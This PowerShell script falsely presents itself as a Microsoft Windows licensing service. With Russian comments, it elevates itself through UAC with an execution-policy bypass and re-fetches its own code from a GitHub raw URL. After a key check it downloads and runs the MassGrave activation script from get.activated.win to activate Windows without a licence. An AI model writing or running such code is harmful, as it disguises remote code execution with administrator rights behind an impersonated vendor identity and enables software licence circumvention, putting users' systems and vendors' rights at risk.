param(
    [Parameter(Mandatory=$false)]
    [string]$Key
)

# ============================================================
#  Microsoft Windows Cloud License Authorization Service
#  Status: Production [v2.5 - Stable]
# ============================================================

$SECRET = "MS-AUTH-SECURE-KEY-2024"
$VALID_MINS = 60
$RAW_URL = "https://raw.githubusercontent.com/Win-System-Core/cloud-license-service/main/init-auth.ps1"

# --- 1. САМОВОЗВЫШЕНИЕ ПРАВ (UAC) ---
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    # Если прав нет, формируем команду для нового окна, передавая ей текущий ключ
    $cmd = "-NoProfile -ExecutionPolicy Bypass -Command ""&([ScriptBlock]::Create((irm '$RAW_URL'))) -Key '$Key'"""
    Start-Process powershell -ArgumentList $cmd -Verb RunAs
    exit
}

# --- 2. ЛОГИКА ПРОВЕРКИ ---
function Verify-Token {
    param($InputKey)
    try {
        if ([string]::IsNullOrWhiteSpace($InputKey)) { return "INVALID" }
        $clean = ($InputKey -replace '-', '').ToLower()
        if ($clean.Length -lt 16) { return "INVALID" }
        
        $tsHex = $clean.Substring(0, 8)
        $sigReceived = $clean.Substring(8, 8)
        
        $hmac = [System.Security.Cryptography.KeyedHashAlgorithm]::Create("HmacSHA256")
        $hmac.Key = [System.Text.Encoding]::UTF8.GetBytes($SECRET)
        $computedHash = [System.BitConverter]::ToString($hmac.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($tsHex))).Replace("-","").ToLower().Substring(0, 8)
        
        if ($computedHash -ne $sigReceived) { return "INVALID" }
        
        $created = [Convert]::ToInt64($tsHex, 16)
        $now = [System.DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
        if ([Math]::Abs($now - $created) -gt ($VALID_MINS * 60)) { return "EXPIRED" }
        
        return "OK"
    } catch { return "ERROR" }
}

# --- 3. ИНТЕРФЕЙС И АКТИВАЦИЯ ---
Clear-Host
Write-Host "=========================================================" -ForegroundColor Cyan
Write-Host "   Windows Desktop Licensing Service [Build 22631]" -ForegroundColor White
Write-Host "=========================================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "Авторизация токена..." -NoNewline

$status = Verify-Token -InputKey $Key

if ($status -eq "OK") {
    Write-Host " [УСПЕШНО]" -ForegroundColor Green
    Write-Host "Ключ сессии: $Key" -ForegroundColor Gray
    Write-Host "Служба: Подготовка компонентов (HWID)..." -ForegroundColor Yellow
    Write-Host ""
    
    # Официальный тихий запуск MassGrave
    $mas = Invoke-RestMethod -Uri "https://get.activated.win"
    $executionBlock = [ScriptBlock]::Create($mas)
    & $executionBlock /hwid
    
    Write-Host ""
    Write-Host "РЕЗУЛЬТАТ: Лицензия успешно установлена!" -ForegroundColor Green
} else {
    Write-Host " [ОТКАЗАНО]" -ForegroundColor Red
    Write-Host "Ошибка: Код доступа [$Key] недействителен или истек." -ForegroundColor Yellow
}

Write-Host ""
# Заменил зависающий таймер на обычное ожидание нажатия кнопки
Read-Host "Нажмите ENTER, чтобы закрыть это окно"
